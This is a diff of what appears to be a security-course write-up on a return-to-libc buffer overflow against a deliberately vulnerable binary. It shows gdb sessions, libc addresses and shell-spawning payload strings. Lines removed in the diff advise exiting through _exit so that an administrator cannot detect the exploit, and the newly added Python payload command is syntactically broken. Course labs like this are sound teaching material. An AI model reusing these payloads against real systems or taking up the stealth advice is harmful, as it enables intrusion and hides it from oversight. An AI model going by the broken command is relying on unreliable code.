@@ -18,14 +18,13 @@ Since this is a simple program we can use the following manual approach. Fire up
 
 Lets go ahead and overflow `buf`
 
-```
-(gdb) r `perl -e 'print "A"x269'`
-```
+`(gdb) r $(python -c 'print "A"*269')`
 
 Output:
 
 ```
-Starting program: /home/amilkov3/Dropbox/CS6035/Project1/vulnerable `perl -e 'print "A"x269'`
+Starting program: /home/amilkov3/Dropbox/CS6035/Project1/vulnerable $(python -c 'print "A"*269')
+
 Program received signal SIGSEGV, Segmentation fault.
 0xb7e2fa41 in __libc_start_main (main=0x804847d <main>, argc=2, 
     argv=0xbffff034, init=0x80484d0 </__libc_csu_init>, 
@@ -35,14 +34,13 @@ Program received signal SIGSEGV, Segmentation fault.
 ```
 Keep adding A's until you fill the return address entirely with them like so:
 
-```
-(gdb) r `perl -e 'print "A"x272'`
-```
+`(gdb) r $(python -c 'print "A"*272')`
+
 ```
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
 
-Starting program: /home/amilkov3/Dropbox/CS6035/Project1/vulnerable `perl -e 'print "A"x272'`
+Starting program: /home/amilkov3/Dropbox/CS6035/Project1/vulnerable $(python -c 'print "A"*272')
 
 Program received signal SIGSEGV, Segmentation fault.
 0x41414141 in ?? ()
@@ -67,9 +65,9 @@ Since we have a non-executable stack, we will still overwrite the return address
 | After overflow       |
 |----------------------|
 | 'sh' address         |
-| HACK          |
-| ebp: system() address |
-| buf[]: 268 'A's                |
+| fake_return          |
+| EBP: system_address |
+| buf[]                |
 
 Already know we need 272 bytes to overwrite the return address so lets fire up gdb to find out the address of the libc `system()` call and an address for string 'sh': `gdb vulnerable`
 
@@ -86,7 +84,7 @@ $1 = {<text variable, no debug info>} <b>0xb7e56190</b> <__libc_system>
 (gdb) info files
 Symbols from "/home/amilkov3/Dropbox/CS6035/Project1/Extraneous/vulnerable".
 Unix child process:
-	Using the running image of child process 2713.
+	Using the running image of child process 2373.
 	While running this, GDB does not access memory from...
 Local exec file:
 	`/home/amilkov3/Dropbox/CS6035/Project1/Extraneous/vulnerable', 
@@ -173,81 +171,35 @@ nu/libc.so.6
 ---Type <return> to continue, or q <return> to quit---
 	0xb7fc0040 - 0xb7fc0ebc is .data in /lib/i386-linux-gnu/libc.so.6
 	0xb7fc0ec0 - 0xb7fc3a7c is .bss in /lib/i386-linux-gnu/libc.so.6
-(gdb) find 0xb7f5fd00,0xb7f81754,"sh"
-0xb7f740f5 <__re_error_msgid+117>
-0xb7f745c1 <afs.8585+193>
-0xb7f76a29
-0xb7f7898e
-4 patterns found.
-(gdb) x/s 0xb7f740f5
-<b>0xb7f740f5</b> <__re_error_msgid+117>:	"sh"
+(gdb) find 0xb7ff67c0,0xb7ffa7a0,'sh'
+Invalid character constant.
+(gdb) find 0xb7ff67c0,0xb7ffa7a0,"sh"
+0xb7ff7e5c <__PRETTY_FUNCTION__.9595+12>
+1 pattern found.
+(gdb) x/s 0xb7ff7e5c
+<b>0xb7ff7e5c</b> <__PRETTY_FUNCTION__.9595+12>:	"sh"
 </pre>
 
 The addresses in bold are the ones we are interested in. Namely on this example machine:
 
-**0xb7e56190** is the address of system()
+0xb7e56190 is the address of system()
 
-**0xb7f740f5** is the address of 'sh'
+0xb7ff7e5c is the address of 'sh'
 
 ##3b. Writing the exploit
 
-All we need to do now is append these 2 addresses to the end of our string of A's in order to essentially call `system('sh')` and spawn a shell
+All we need to do now is append these 2 addresses to the end of our string of A's in order to call essentially call `system('sh')` and spawn a shell
 
 Here's what little math we need:
 
 - Smashing EIP: 272 - 4 = 268 'A's needed
 - Append system() -> "\x90\x61\xe5\xb7" * 2 since we need to fill the return address as well
-- Append 'sh' -> "\xf5\x40\xf7\xb7"
+- Append 'sh' -> "\x5c\x7e\xff\xb7"
 
 On the command line:
 
-```
-comp-name # ./vulnerable `perl -e 'print "A"x268 . "\x90\x61\xe5\xb7HACK\xf5\x40\xf7\xb7"'`
-```
-Verify that you spawned the shell. On my VM it looks like so:
+`comp-name # ./vulnerable $(python -c 'A'*268 + "\x90\x61\xe5\xb7\x90\x61\xe5\xb7\x5c\x7e\xff\xb7"`
 
-```
-amilkov3@amilkov3-VirtualBox:~/Dropbox/CS6035/Project1/Extraneous$ ./vulnerable `perl -e 'print "A"x268 . "\x90\x61\xe5\xb7HACK\xf5\x40\xf7\xb7"'`
-$ whoami
-amilkov3
-$ exit
-Segmentation fault (core dumped)
-amilkov3@amilkov3-VirtualBox:~/Dropbox/CS6035/Project1/Extraneous$ 
-```
+Verify that you spawned the shell
 
-##4. Exiting cleanly
-
-Notice how when we tried to exit above we got a segmentation fault. This core dump will be logged and an administrator will be able to tell you exploited a binary. In order to remain stealthy we will change the return address of HACK to the libc address of exit() or in the case of our Ubuntu VM: _exit. Here's how we find that address:
-
-Go ahead and run vulnerable in gdb again: `gdb vulnerable`
-
-<pre>
-(gdb) b main
-Breakpoint 1 at 0x8048489: file vulnerable.c, line 5.
-(gdb) r
-Starting program: /home/amilkov3/Dropbox/CS6035/Project1/Extraneous/vulnerable 
-
-Breakpoint 1, main (argc=1, argv=0xbffff124) at vulnerable.c:5
-5		memcpy(buf, argv[1], strlen(argv[1]));
-(gdb) p _exit
-$1 = {<text variable, no debug info>} <b>0xb7ecbbc4</b> <_exit>
-</pre>
-
-And now lets run our exploit 
-
-```
-comp-name # ./vulnerable `perl -e 'print "A"x268 . "\x90\x61\xe5\xb7\xc4\xbb\xec\xb7\xf5\x40\xf7\xb7"'`
-```
-
-And verify we've spawned our shell:
-
-```
-amilkov3@amilkov3-VirtualBox:~/Dropbox/CS6035/Project1/Extraneous$ ./vulnerable `perl -e 'print "A"x268 . "\x90\x61\xe5\xb7\xc4\xbb\xec\xb7\xf5\x40\xf7\xb7"'`
-$ whoami
-amilkov3
-$ exit
-amilkov3@amilkov3-VirtualBox:~/Dropbox/CS6035/Project1/Extraneous$ 
-``` 
-
-Voila!
-
+##4b. Exiting cleanly
